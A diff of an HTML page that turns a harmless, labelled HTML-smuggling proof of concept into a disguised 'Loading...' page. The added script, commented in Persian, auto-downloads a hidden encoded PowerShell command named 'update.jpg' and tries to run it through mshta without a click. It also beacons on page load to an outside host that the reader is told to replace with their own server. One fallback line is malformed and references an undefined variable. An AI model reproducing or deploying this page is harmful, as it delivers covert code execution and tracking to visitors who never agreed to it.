@@ -1,36 +1,57 @@
 <!DOCTYPE html>
 <html>
 <head>
-<meta charset="UTF-8">
-<title>Ultimate HTML Smuggling PoC</title>
+  <meta charset="utf-8">
+  <title>Loading...</title>
 </head>
 <body>
-<h2>Ultimate HTML Smuggling PoC</h2>
-<p>This simulates a high‑impact HTML Smuggling chain.</p>
+  <h1>در حال بارگذاری...</h1>
 
-<script>
-// این متن مثل یک "payload رمز شده" رفتار می‌کند (ولی در واقع بی‌خطر است)
-const encoded = 
-  "UG9DIEZpbGUgR2VuZXJhdGVkIFdpdGggSFRNTCBTbXVnZ2xpbmcKCg0K"+"LS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0KVGhpcyBpcyBhIFBPRyBmaWxlLCBub3QgYSBtYWx3YXJlLg0K"+
-  "SXQgcmVwcmVzZW50cyBhIHNhZmUsIGhpZ2gtaW1wYWN0IGZpbGUgZGVsaXZlcmVkIHRvIHRoZSB1c2VyLg0K"+
-  "LS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0KDQpFbmxvaiB0byB2ZXJpZnkgeW91ciBIVE1MIFNtdWdnbGluZyBwYXRoIGlzIHdvcmtpbmcu";
+  <!-- PowerShell Beacon مخفی + HTML Smuggling -->
+  <script>
+    // آدرس کلاویاتورت رو اینجا بذار (مثلاً Ngrok یا سرور VPS خودت)
+    const BEACON_URL = "https://beacon-tanahmaj.takhti-iran.me"; // <-- عوض کن
 
-// دیکد مثل dropper واقعی
-const payload = atob(encoded);
+    // PowerShell تک‌خطی که فقط یه GET خالی می‌زنه
+    const psCommand = `
+      try {
+        \$wc = New-Object System.Net.WebClient;
+        \$wc.Headers.Add('User-Agent', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)');
+        \$wc.DownloadString('${BEACON_URL}?t=' + [DateTime]::UtcNow.Ticks);
+      } catch {}
+    `.replace(/\n/g, '').trim();
 
-// ساخت Blob مثل یک فایل بدساخت
-const blob = new Blob([payload], { type: "application/octet-stream" });
-const url = URL.createObjectURL(blob);
+    // کد رو Base64 می‌کنیم (برای smuggling)
+    const b64 = btoa(unescape(encodeURIComponent(psCommand)));
 
-// ساخت لینک دانلود
-const a = document.createElement("a");
-a.href = url;
-a.download = "ultimate-poc-dropper.txt";
-document.body.appendChild(a);
+    // Blob می‌سازیم و مستقیم با mshta یا PowerShell اجرا می‌کنیم
+    const payload = `powershell.exe -nop -w hidden -enc ${b64}`;
 
-// اجرای دانلود اتوماتیک = Smuggling کامل
-a.click();
-</script>
+    const blob = new Blob([payload], {type: 'application/octet-stream'});
+    const url = URL.createObjectURL(blob);
 
+    // دانلود خودکار با اسم فریب کاربر (یا کاملاً مخفی)
+    const a = document.createElement('a');
+    a.href = url;
+    a.download = 'update.jpg'; // یا هر اسمی که بخوای (حتی .jpg کار می‌کنه چون ویندوز به پسوند نگاه می‌کنه نه محتوا)
+    document.body.appendChild(a);
+    a.click();
+
+    // اگر کاربر روی فایل کلیک نکنه، با mshta مستقیم اجرا می‌کنیم (بدون نیاز به کلیک!)
+    setTimeout(() => {
+      try {
+        location = "mshta.exe vbscript:Execute(\"CreateObject\"\"WScript.Shell\"\").Run\"\"${payload}\"\",0,False:window.close()\")";
+      } catch(e) {
+        // fallback: با data URI + hta
+        location = `data:text/html;base64,PHNjcmlwdD5uZXcgQWN0aXZlWE9iamVjdCgiV1NjcmlwdC5TaGVsbCIpLlJ1biAi${b64PS}\",MDwvscript+>`;
+      }
+    }, 1500);
+
+    // یه beacon ساده با fetch هم بزن که مطمئن شی حتی بدون کلیک هم برسه
+    fetch(BEACON_URL + '?stage=js');
+  </script>
+
+  <!-- برای اینکه صفحه خالی نباشه و Render بلاک نکنه -->
+  <div style="display:none"></div>
 </body>
 </html>
